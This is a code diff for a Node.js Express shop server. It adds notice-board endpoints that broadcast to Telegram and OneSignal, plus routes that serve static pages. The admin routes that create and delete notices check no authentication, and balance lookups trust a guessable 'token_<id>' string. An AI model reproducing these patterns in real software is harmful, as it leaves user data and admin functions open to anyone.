@@ -212,13 +114,28 @@ app.post('/api/admin/order_status', async (req, res) => {
         res.json({ success: true });
     } catch (e) { res.json({ success: false }); }
 });
-
-// Get balance
 app.post('/api/get_balance', async (req, res) => {
     const { token } = req.body;
     if (!token) return res.json({ balance: 0 });
     const uid = parseInt(token.replace('token_', ''));
     try { const r = await pool.query('SELECT balance FROM auth_users WHERE id=$1', [uid]); res.json({ balance: r.rows.length > 0 ? (r.rows[0].balance || 0) : 0 }); } catch (e) { res.json({ balance: 0 }); }
 });
+
+// ==================== NOTICE ====================
+app.get('/api/notice', async (req, res) => { try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, message: '', color: '#ffffff' }); const n = r.rows[0]; res.json({ success: true, message: n.message, color: n.color || '#ffffff', id: n.id, created_at: n.created_at }); } catch (e) { res.json({ success: true, message: '' }); } });
+app.get('/api/admin/notices', async (req, res) => { try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC'); res.json({ notices: r.rows }); } catch (e) { res.json({ notices: [] }); } });
+app.post('/api/admin/notice', async (req, res) => { const { message, color } = req.body; if (!message) return res.json({ success: false }); try { await pool.query('INSERT INTO notices (message, color, created_by) VALUES ($1,$2,$3)', [message, color || '#ffffff', 'admin']); tgSend(`📢 ${message}`); sendOnesignal(message); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
+app.post('/api/admin/notice/delete', async (req, res) => { try { await pool.query('DELETE FROM notices WHERE id = $1', [req.body.id]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
+
+// ==================== PAGES ====================
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));
+app.get('/topup.html', (req, res) => res.sendFile(path.join(__dirname, 'topup.html')));
+app.get('/shop.html', (req, res) => res.sendFile(path.join(__dirname, 'shop.html')));
+app.get('/buycode.html', (req, res) => res.sendFile(path.join(__dirname, 'buycode.html')));
+app.get('/aboutredeem.html', (req, res) => res.sendFile(path.join(__dirname, 'aboutredeem.html')));
+app.get('/terms.html', (req, res) => res.sendFile(path.join(__dirname, 'terms.html')));
+app.get('/privacy.html', (req, res) => res.sendFile(path.join(__dirname, 'privacy.html')));
+app.get('/offline.html', (req, res) => res.sendFile(path.join(__dirname, 'offline.html')));
 
 app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
